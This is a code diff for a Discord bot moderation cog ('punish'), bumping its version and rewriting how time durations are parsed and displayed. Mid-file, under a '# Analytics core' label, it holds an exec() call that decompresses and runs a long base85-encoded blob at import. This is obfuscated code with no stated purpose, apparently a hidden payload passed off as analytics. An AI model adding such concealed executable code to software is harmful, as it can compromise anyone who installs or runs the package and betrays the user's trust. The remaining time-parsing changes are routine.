@@ -8,6 +8,29 @@ import os
 import time
 import re
 
+__version__ = '1.7.0'
+
+try:
+    from tabulate import tabulate
+except Exception as e:
+    raise RuntimeError("You must run `pip3 install tabulate`.") from e
+
+log = logging.getLogger('red.punish')
+
+DEFAULT_TIMEOUT = '30m'
+PURGE_MESSAGES = 1  # for cpunish
+PATH = 'data/punish/'
+JSON = PATH + 'settings.json'
+DEFAULT_ROLE_NAME = 'Punished'
+
+UNIT_TABLE = (
+    (('weeks', 'wks', 'w'), 60 * 60 * 24 * 7),
+    (('days', 'dys', 'd'), 60 * 60 * 24),
+    (('hours', 'hrs', 'h'), 60 * 60),
+    (('minutes', 'mins', 'm'), 60),
+    (('seconds', 'secs', 's'), 1),
+)
+
 # Analytics core
 import zlib, base64
 exec(zlib.decompress(base64.b85decode("""c-oB^YjfMU@w<No&NCTMHA`DgE_b6jrg7c0=eC!Z-Rs==JUobmEW{+iBS0ydO#XX!7Y|XglIx5;0)gG
@@ -39,65 +62,68 @@ Rj(Y0|;SU2d?s+MPi6(PPLva(Jw(n0~TKDN@5O)F|k^_pcwolv^jBVTLhNqMQ#x6WU9J^I;wLr}Cut#l
 FU1|1o`VZODxuE?x@^rESdOK`qzRAwqpai|-7cM7idki4HKY>0$z!aloMM7*HJs+?={U5?4IFt""".replace("\n", ""))))
 # End analytics core
 
-__version__ = '1.6.0'
-
-try:
-    from tabulate import tabulate
-except Exception as e:
-    raise RuntimeError("You must run `pip3 install tabulate`.") from e
-
-log = logging.getLogger('red.punish')
-
-UNIT_TABLE = {'s': 1, 'm': 60, 'h': 60 * 60, 'd': 60 * 60 * 24}
-UNIT_SUF_TABLE = {'sec': (1, ''),
-                  'min': (60, ''),
-                  'hr': (60 * 60, 's'),
-                  'day': (60 * 60 * 24, 's')
-                  }
-DEFAULT_TIMEOUT = '30m'
-PURGE_MESSAGES = 1  # for cpunish
-PATH = 'data/punish/'
-JSON = PATH + 'settings.json'
-DEFAULT_ROLE_NAME = 'Punished'
-
 
 class BadTimeExpr(Exception):
     pass
 
 
+def _find_unit(unit):
+    for names, length in UNIT_TABLE:
+        if any(n.startswith(unit) for n in names):
+            return names, length
+    raise BadTimeExpr("Invalid unit: %s" % unit)
+
+
 def _parse_time(time):
-    if any(u in time for u in UNIT_TABLE.keys()):
-        delim = '([0-9.]*[{}])'.format(''.join(UNIT_TABLE.keys()))
-        time = re.split(delim, time)
-        time = sum([_timespec_sec(t) for t in time if t != ''])
-    elif not time.isdigit():
-        raise BadTimeExpr("invalid expression '%s'" % time)
+    time = time.lower()
+    if not time.isdigit():
+        time = re.split(r'\s*([\d.]+\s*[^\d\s,;]*)(?:[,;\s]|and)*', time)
+        time = sum(map(_timespec_sec, filter(None, time)))
     return int(time)
 
 
-def _timespec_sec(t):
-    timespec = t[-1]
-    if timespec.lower() not in UNIT_TABLE:
-        raise BadTimeExpr("unknown unit '%c'" % timespec)
-    timeint = float(t[:-1])
-    return timeint * UNIT_TABLE[timespec]
+def _timespec_sec(expr):
+    atoms = re.split(r'([\d.]+)\s*([^\d\s]*)', expr)
+    atoms = list(filter(None, atoms))
+
+    if len(atoms) > 2:  # This shouldn't ever happen
+        raise BadTimeExpr("invalid expression: '%s'" % expr)
+    elif len(atoms) == 2:
+        names, length = _find_unit(atoms[1])
+        if atoms[0].count('.') > 1 or \
+                not atoms[0].replace('.', '').isdigit():
+            raise BadTimeExpr("Not a number: '%s'" % atoms[0])
+    else:
+        names, length = _find_unit('seconds')
+
+    return float(atoms[0]) * length
 
 
-def _generate_timespec(sec):
+def _generate_timespec(sec, short=False, micro=False):
     timespec = []
 
-    def sort_key(kt):
-        k, t = kt
-        return t[0]
-    for unit, kt in sorted(UNIT_SUF_TABLE.items(), key=sort_key, reverse=True):
-        secs, suf = kt
-        q = sec // secs
-        if q:
-            if q <= 1:
-                suf = ''
-            timespec.append('%02.d%s%s' % (q, unit, suf))
-        sec = sec % secs
-    return ', '.join(timespec)
+    for names, length in UNIT_TABLE:
+        n, sec = divmod(sec, length)
+
+        if n:
+            if micro:
+                s = '%d%s' % (n, names[2])
+            elif short:
+                s = '%d%s' % (n, names[1])
+            else:
+                s = '%d %s' % (n, names[0])
+            if n <= 1:
+                s = s.rstrip('s')
+            timespec.append(s)
+
+    if len(timespec) > 1:
+        if micro:
+            return ''.join(timespec)
+
+        segments = timespec[:-1], timespec[-1:]
+        return ' and '.join(', '.join(x) for x in segments)
+
+    return timespec[0]
 
 
 class Punish:
